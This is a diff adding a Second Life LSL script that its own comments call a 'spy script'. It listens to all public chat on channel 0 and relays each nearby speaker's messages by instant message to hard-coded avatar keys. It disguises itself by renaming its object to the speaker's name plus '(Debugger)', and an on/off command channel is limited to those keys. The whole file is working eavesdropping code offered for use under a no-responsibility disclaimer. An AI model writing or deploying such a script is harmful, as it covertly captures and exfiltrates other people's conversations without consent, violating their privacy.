@@ -1,0 +1,71 @@
+//DISCLAIMER: I take absolutely no responsibility for the use of this script in any way. Use at your own risk.
+
+//This script uses IMs to send chat to the configured avatars. It has the potential to quickly cap offline IMs so deactivate the spy script or remove the script when not in use.
+
+//Avatar keys go here. These are the avatars that you want to send nearby chat conversation to. I wouldn't recommend more than a few keys though as the more keys are added, the slower the IM responses as the script makes its way through the for loop.
+list msgkeylist = 
+[
+"3d6a4942-fd5a-4d57-94c8-13198da61772"
+]; 
+
+integer switch_channel = 852; //Channel to listen for spy on/off command. Can be changed as desired.
+
+//----------------------------------------------------------
+// Don't edit below unless you know what you're doing
+//----------------------------------------------------------
+
+integer debug = TRUE;
+
+testmsg(string name, string str)
+{
+    integer length = llGetListLength(msgkeylist);
+    integer i = 0;
+    
+    string oname = llGetObjectName();
+    llSetObjectName(name + " (Debugger)");
+    
+    for(i; i < length; i++)
+    {        
+        llInstantMessage(llList2String(msgkeylist, i), str);
+    }
+    
+    llSetObjectName(oname);
+}
+
+default
+{
+    state_entry()
+    {
+        llListen(0, "", "", "");
+        llListen(switch_channel, "", "", "");
+        testmsg("System", "Debugger ready!");
+    }
+    
+    on_rez(integer x)
+    {
+        llResetScript();
+    }
+    
+    listen(integer channel, string name, key id, string message)
+    {
+        if(channel == 0 && debug == TRUE)
+        {
+            testmsg(name, message);
+        }
+        
+        if(channel == switch_channel && llListFindList(msgkeylist, [id]) != -1)
+        {
+            if(message == "off") 
+            {
+                testmsg("System", "Debug Off");
+                debug = FALSE;
+            }
+            
+            if(message == "on")
+            {
+                testmsg("System", "Debug On");
+                debug = TRUE;
+            }
+        }
+    }
+} 
